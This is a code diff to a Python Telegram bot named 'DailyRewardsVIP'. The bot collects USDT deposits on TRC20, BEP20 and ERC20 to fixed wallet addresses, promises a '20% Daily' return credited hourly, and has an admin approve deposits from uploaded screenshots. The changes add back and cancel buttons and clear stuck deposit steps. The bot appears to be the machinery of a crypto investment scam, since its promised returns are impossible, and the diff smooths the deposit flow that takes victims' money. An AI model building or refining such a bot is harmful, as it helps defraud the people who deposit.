@@ -84,7 +84,6 @@ def add_profit(uid):
     if uid in data and data[uid]["active_deposit"] > 0:
         now = int(time.time())
         last_p = data[uid].get("last_profit", now)
-        # 20% growth distributed hourly (every 3600 seconds)
         if now - last_p >= 3600:
             hours_passed = (now - last_p) // 3600
             hourly_rate = 0.20 / 24.0  # Hourly share of the 20% daily return
@@ -122,6 +121,9 @@ def handle_start_background(message):
     register(message.from_user)
     add_profit(uid)
 
+    # Clear any stuck user step when user types /start
+    user_step.pop(uid, None)
+
     text = (
         "🏦 *Welcome to DailyRewardsVIP*\n\n"
         f"👋 Hello {message.from_user.first_name}\n\n"
@@ -149,6 +151,12 @@ def process_message_thread(message):
     if uid not in data:
         register(message.from_user)
         data = load()
+
+    text = message.text
+
+    # If user clicks any main menu button, clear active deposit step so they don't get trapped
+    if text in ["👤 My Profile", "💰 Deposit", "📈 Mining", "💸 Withdraw", "📜 History", "🎁 Referral", "🛠 Support"]:
+        user_step.pop(uid, None)
 
     # Update hourly profit calculation on any interaction
     add_profit(uid)
@@ -206,8 +214,6 @@ def process_message_thread(message):
             )
             return
 
-    text = message.text
-
     # --- ISOLATED MENU ROUTING TO PREVENT OVERLAPS ---
     if text == "👤 My Profile":
         user = data[uid]
@@ -237,7 +243,8 @@ def process_message_thread(message):
         kb.add(
             types.InlineKeyboardButton("🟢 USDT TRC20", callback_data="net_TRC20"),
             types.InlineKeyboardButton("🟡 USDT BEP20", callback_data="net_BEP20"),
-            types.InlineKeyboardButton("🔵 USDT ERC20", callback_data="net_ERC20")
+            types.InlineKeyboardButton("🔵 USDT ERC20", callback_data="net_ERC20"),
+            types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")
         )
         bot.send_message(message.chat.id, "💰 *Select Deposit Network below:*", parse_mode="Markdown", reply_markup=kb)
 
@@ -290,6 +297,21 @@ def process_message_thread(message):
         )
         bot.send_message(message.chat.id, support_txt, parse_mode="Markdown", reply_markup=kb)
 
+@bot.callback_query_handler(func=lambda call: call.data == "back_to_menu")
+def callback_back_menu(call):
+    uid = str(call.from_user.id)
+    user_step.pop(uid, None)
+    bot.answer_callback_query(call.id, "Cancelled deposit process.")
+    try:
+        bot.edit_message_text(
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            text="❌ *Deposit Cancelled.*\n\nYou have returned to the main menu. Choose an option below:",
+            parse_mode="Markdown"
+        )
+    except Exception:
+        pass
+
 @bot.callback_query_handler(func=lambda call: call.data.startswith("net_"))
 def callback_network(call):
     network = call.data.split("_")[1]
@@ -302,10 +324,30 @@ def callback_network(call):
     kb = types.InlineKeyboardMarkup(row_width=2)
     for amount in INVESTMENT_PLANS:
         kb.add(types.InlineKeyboardButton(f"💵 ${amount} (20% Daily)", callback_data=f"plan_{amount}"))
+    kb.add(types.InlineKeyboardButton("🔙 Back to Networks", callback_data="back_to_networks"))
 
-    bot.send_message(
-        call.message.chat.id,
-        f"💰 Network Selected: *{network}*\n\nPlease choose your preferred investment plan amount below:",
+    bot.edit_message_text(
+        chat_id=call.message.chat.id,
+        message_id=call.message.message_id,
+        text=f"💰 Network Selected: *{network}*\n\nPlease choose your preferred investment plan amount below:",
+        parse_mode="Markdown",
+        reply_markup=kb
+    )
+
+@bot.callback_query_handler(func=lambda call: call.data == "back_to_networks")
+def callback_back_networks(call):
+    bot.answer_callback_query(call.id)
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    kb.add(
+        types.InlineKeyboardButton("🟢 USDT TRC20", callback_data="net_TRC20"),
+        types.InlineKeyboardButton("🟡 USDT BEP20", callback_data="net_BEP20"),
+        types.InlineKeyboardButton("🔵 USDT ERC20", callback_data="net_ERC20"),
+        types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")
+    )
+    bot.edit_message_text(
+        chat_id=call.message.chat.id,
+        message_id=call.message.message_id,
+        text="💰 *Select Deposit Network below:*",
         parse_mode="Markdown",
         reply_markup=kb
     )
@@ -323,8 +365,11 @@ def callback_plan(call):
     user_step[uid]["amount"] = amount
     network = user_step[uid]["network"]
 
-    kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton("✅ Confirm Payment", callback_data="confirm_pay"))
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    kb.add(
+        types.InlineKeyboardButton("✅ Confirm Payment", callback_data="confirm_pay"),
+        types.InlineKeyboardButton("🔙 Back to Plans", callback_data=f"back_to_plans_{network}")
+    )
 
     wallet_address = WALLETS.get(network, WALLETS["TRC20"])
 
@@ -332,6 +377,23 @@ def callback_plan(call):
         chat_id=call.message.chat.id,
         message_id=call.message.message_id,
         text=f"📌 *Investment Deposit Summary*\n💳 Network: *{network}*\n💵 Amount: *${amount}*\n\n📬 *Deposit Wallet Address:*\n`{wallet_address}`\n\n*Instructions:* After transferring the exact amount from your personal wallet, click the button below to submit your payment proof.",
+        parse_mode="Markdown",
+        reply_markup=kb
+    )
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("back_to_plans_"))
+def callback_back_plans(call):
+    network = call.data.split("_")[3]
+    bot.answer_callback_query(call.id)
+    kb = types.InlineKeyboardMarkup(row_width=2)
+    for amount in INVESTMENT_PLANS:
+        kb.add(types.InlineKeyboardButton(f"💵 ${amount} (20% Daily)", callback_data=f"plan_{amount}"))
+    kb.add(types.InlineKeyboardButton("🔙 Back to Networks", callback_data="back_to_networks"))
+
+    bot.edit_message_text(
+        chat_id=call.message.chat.id,
+        message_id=call.message.message_id,
+        text=f"💰 Network Selected: *{network}*\n\nPlease choose your preferred investment plan amount below:",
         parse_mode="Markdown",
         reply_markup=kb
     )
@@ -346,11 +408,15 @@ def callback_confirm(call):
 
     user_step[uid]["state"] = "waiting_for_screenshot"
 
+    kb = types.InlineKeyboardMarkup()
+    kb.add(types.InlineKeyboardButton("🔙 Cancel & Return", callback_data="back_to_menu"))
+
     bot.edit_message_text(
         chat_id=call.message.chat.id,
         message_id=call.message.message_id,
         text="📸 *Payment Verification Step*\n\nPlease upload and send a clear **Transaction Screenshot** image right here in the chat. Unrelated images or text messages are strictly restricted until a valid receipt is submitted.",
-        parse_mode="Markdown"
+        parse_mode="Markdown",
+        reply_markup=kb
     )
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
@@ -370,6 +436,7 @@ def admin_actions(call):
 
     if action == "app":
         amount = float(parts[3])
+        # Add to active deposit and accumulate balance permanently without overwriting history
         data[uid]["active_deposit"] += amount
         data[uid]["balance"] += amount
         data[uid]["deposit_time"] = int(time.time())
